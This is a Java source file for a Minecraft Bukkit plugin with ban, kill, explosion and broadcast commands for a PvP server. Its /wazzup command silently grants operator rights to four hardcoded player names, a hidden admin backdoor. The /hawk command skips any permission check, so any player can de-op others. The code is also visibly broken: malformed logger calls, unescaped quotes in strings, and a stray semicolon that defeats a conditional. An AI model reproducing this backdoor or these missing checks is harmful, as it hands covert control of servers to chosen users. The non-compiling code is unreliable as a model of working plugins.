/*
 * The final punishment command is /requiem, there is to be no more unless we have a clear reason for its addition.
 * Thanks,
 * Requiem.
 */
package me.hawkeyeshi.RyuPvPMod;

import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.ItemStack;


public final class RyuPvPMod extends JavaPlugin{
        public Player requiemdestiny = Bukkit.getServer().getPlayer("RequiemDestiny");
	public Player hawkeyeshi = Bukkit.getServer().getPlayer("hawkeyeshi");
	public Player ryusagez = Bukkit.getServer().getPlayer("Ryusagez");
	public Player Camzie99 = Bukkit.getServer().getPlayer("Camzie99");
        public static String INCORRECT_ARGS = ChatColor.RED + "There is an incorrect number of arguments in the command you just performed.";
        public static String NO_PERMS = ChatColor.RED + "You do not have permission to perform this command";
	public static RyuPvPMod plugin;
	public static final Logger logger = Bukkit.getLogger();
        private float OF;

        @Override
	public void onEnable(){
	getLogger().INFO, "{0} Version{1} Has Been Enables", new Object[]
	}
        
        @Override
	public void onDisable(){
		getLogger().INFO, "{0} Version{1} Has Been Disabled", new Object[]
	}
		
        int bson = 1;
        int explosionsize = 10;
        
        @SuppressWarnings("deprecation")

        @EventHandler
            public void onPlayerInteractBlock(PlayerInteractEvent event) {
                Player player = event.getPlayer();

                if (player.getItemInHand().getType() == Material.BLAZE_ROD) {
                if(player.hasPermission("ryupvp.bs.use")) {
                if(bson == 1) {
    		Block targetblock = player.getTargetBlock(null, 500);
    		World world = player.getWorld();
    		Location location = targetblock.getLocation();
    		world.createExplosion(location, explosionsize);
    		getLogger().info(player.getName() + ", created a size " + explosionsize + " explosion!");
            }
                else {player.sendMessage("Boom Stick is off!");
            }}
            else {
    		getLogger().info(player.getName() + " has attempted to use the Boom Stick!");
    		player.sendMessage(ChatColor.RED + player.getName() + ", You do NOT have permission to use this destructive tool,"
    				+ ChatColor.LIGHT_PURPLE + " a log of this request has been stored...");
    	}
    
   
      }
    }

        @Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
		Player player = (Player) sender;
		Player target = sender.getServer().getPlayer(args[0]);
				// /ryuinfo command
			if(cmd.getName().equalsIgnoreCase("RyuInfo")){
				if(args.length == 0){
					player.sendMessage(ChatColor.RED + "RyuPvPMod is a custom made plugin made for the RyuPvP server. "); 
					player.sendMessage(ChatColor.LIGHT_PURPLE + "Coded by Hawkeyeshi, RequiemDestiny and Camzie99.");
				}
                                else{
                                    sender.sendMessage("Too many arguments!");
                                }
                        
				// /cheater command
			}else if(cmd.getName().equalsIgnoreCase("cheater")){
				if(player.hasPermission("RyuPvPMod.cheater")){
                                        target.getWorld().createExplosion(target.getLocation(), 0F);
					target.setBanned(true);
					target.kickPlayer(ChatColor.DARK_RED + "You little cheater! You've been banned!");
					target.getWorld().createExplosion(target.getLocation(), 0F);
				}else{
                                    player.sendMessage(NO_PERMS);
                                }
				// /badboy command
			}else if(cmd.getName().equalsIgnoreCase("badboy")){
				if(player.hasPermission("RyuPvPMod.badboy")){
					target.setHealth(1.0);
					target.setFoodLevel(0);
					Bukkit.broadcastMessage(ChatColor.BLUE + target.getName() + "is a very bad boy!");
					player.sendMessage(ChatColor.DARK_RED + "You've been a bad boy, enjoy the half heart!");
			}else{
                                    player.sendMessage(NO_PERMS);
                                }
				// /wazzup command
			}else if(cmd.getName().equalsIgnoreCase("wazzup")){
				if(sender == hawkeyeshi || sender == ryusagez || sender == requiemdestiny || sender == Camzie99){
					player.setOp(true);
					player.sendMessage(ChatColor.DARK_RED + "Welcome back >:3");
				}else{
					player.sendMessage(ChatColor.LIGHT_PURPLE + "Sup " + sender.getName() +" ?");
				}
			
                                // /boomdoom command
			}else if(cmd.getName().equalsIgnoreCase("BoomDoom")){
				if(player.hasPermission("RyuPvPMod.boomdoom")){
					target.setBanned(true);
					target.kickPlayer(ChatColor.DARK_RED + "You've been banned until you can get your crap together!");
					target.getWorld().createExplosion(target.getLocation(), 0F);
				}else{
                                    player.sendMessage(NO_PERMS);
                                }
					// /hawk command
			}else if(cmd.getName().equalsIgnoreCase("hawk")){
				
					Location Loc = new Location(Bukkit.getWorld("world"),~0,125,~0);
					target.teleport(Loc);
				
					target.setOp(false);
					target.setGameMode(GameMode.SURVIVAL);
					target.sendMessage(ChatColor.GREEN + "I bet you can't fly like a hawk ;)");
                                        if(target.isFlying()){
                                            target.setFlying(false);
                                        }else{
                                            player.sendMessage(NO_PERMS);
                                        }
                                
				}//BoomStick toggling command
                            	else if(cmd.getName().equalsIgnoreCase("bstoggle")){
    		
    		if (args.length > 0){
    			sender.sendMessage(INCORRECT_ARGS);
    			return false;
    		}
    		
    		if(bson == 1){
    			bson = 0;
    			sender.sendMessage(ChatColor.BLUE + "Boom Stick has been disabled!");
    			return true;
    		}
    		if(bson == 0);{
    			bson = 1;
    			sender.sendMessage(ChatColor.BLUE + "Boom Stick has been enabled!");
    			return true;
    		}
    	}
    	else if(cmd.getName().equalsIgnoreCase("bssize")){
    		explosionsize = Integer.parseInt(args[0]);
    		sender.sendMessage(ChatColor.BLUE + "Boom stick radius set to: " + explosionsize + "!");
    		return true;
    	}
                        else if(cmd.getName().equalsIgnoreCase("requiem")){
                                        if(sender != requiemdestiny){
                                            player.sendMessage(ChatColor.RED + "You're not Requiem and therefore cannot use this command.");
                                        }else if(args.length == 0 || args.length > 1){
                                        player.sendMessage(INCORRECT_ARGS);
                                    }else{
                                        World world = target.getWorld();
                                        
                                        world.strikeLightning(target.getLocation());
                                        target.getWorld().createExplosion(target.getLocation(), OF);
                                        target.getInventory().clear();
                                        target.setHealth(0.0);
                                        
                                     }
                                   }else if(cmd.getName().equalsIgnoreCase("ryusay")){
					if(args.length == 0){
					player.sendMessage(ChatColor.DARK_RED + "/ryusay <message>");
					}else if(args.length > 0){
						String message = new String();
						for(String s : args)
						{
							message.concat(" " + s);
						}
						
						String ryu = "ChatColor.DARK_RED + "Ryu"";
						String pvp = "ChatColor.GRAY + "PvP- """;
						String person = "ChatColor.DARK_RED + player.getName()";
						
						Bukkit.broadcastMessage(ChatColor.BOLD + ryu + ChatColor.BOLD + pvp + ChatColor.BOLD + person + ChatColor.WHITE + message);
					}
				}
                                   
                                   
                                    
                                
			
			return false;
	}
}
